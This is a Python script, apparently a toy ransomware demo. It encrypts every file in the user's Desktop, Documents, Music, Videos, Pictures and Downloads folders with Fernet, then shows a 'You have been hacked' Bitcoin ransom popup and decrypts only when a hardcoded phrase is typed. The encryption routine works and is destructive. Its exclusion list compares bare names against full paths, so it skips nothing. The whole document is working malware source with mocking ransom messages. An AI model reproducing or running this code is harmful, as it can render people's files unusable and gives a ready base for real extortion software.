import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
from tkinter import simpledialog


# Define the list of directories to be traversed
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]

# Initialize an empty list to store all the files in the specified directories
files = []

# Traverse each directory and subdirectory to get all files
for directory in directories:
    for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
        for filename in filenames:
            files.append(os.path.join(root, filename))

# Generate the encryption key and save it in a file
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# these files should not be encrypted
forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]

# Encrypt each file with the generated key
for file in files:
    if file in forbidden_files:
        continue
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# Create a pop-up message box
root = tk.Tk()
root.withdraw()  # Hide the main window
messagebox.showinfo("Encryption Complete", "You have been hacked. Toss a Bitcoin here at *********** to receive your files back ;) ")

# Let's imagine that by clicking the ok in the popup that somehow a bitcoin gets transfered...

messagebox.showinfo("message", "Bitcoin received, secret code is 'coffee'. Now running decryption. Click ok to continue.")

# Read the secret key from the file
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

# Get the secret phrase
secret_phrase = "coffee"

while True:
    user_input = simpledialog.askstring("Input", "Please enter the code: Enter the secret phrase to decrypt your files")
    if user_input != "coffee":
        messagebox.showinfo("message", "Try again fool!")
    else:
        for file in files:
            if file in forbidden_files:
                continue
            with open(file, "rb") as file_to_decrypt:
                encrypted_content = file_to_decrypt.read()
            decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
            with open(file, "wb") as decrypted_file:
                decrypted_file.write(decrypted_content)

        messagebox.showinfo("message", "Thanks loser :) You can have your files back now")
        break  # Exit the loop when the correct phrase is entered


root.mainloop() 